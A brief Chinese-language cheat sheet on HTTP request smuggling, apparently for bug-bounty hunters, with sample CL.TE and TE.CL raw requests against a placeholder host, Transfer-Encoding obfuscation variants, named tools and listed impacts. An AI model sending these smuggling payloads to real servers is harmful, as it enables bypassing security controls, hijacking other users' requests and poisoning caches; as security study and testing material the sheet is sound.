# HTTP 请求走私

## 核心原理
前端和后端对 HTTP 请求边界的理解不一致。

## 攻击类型

### CL.TE（前端用 Content-Length，后端用 Transfer-Encoding）
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL（前端用 Transfer-Encoding，后端用 Content-Length）
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### TE.TE（双方都支持 TE，但一方被混淆绕过）
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding:[tab]chunked
X: X[\n]Transfer-Encoding: chunked
```

### HTTP/2 请求走私
- HTTP/2 降级到 HTTP/1.1 时注入无效头或 CRLF

## 工具
- **HTTP Request Smuggler**（Burp 扩展）
- **Smuggler**（Python 3，defparam）

## SRC 实战要点
- 高难度高回报漏洞
- 需要理解前端/后端服务器差异
- CL.TE 最常见
- 影响：绕过安全控制、凭证劫持、缓存投毒
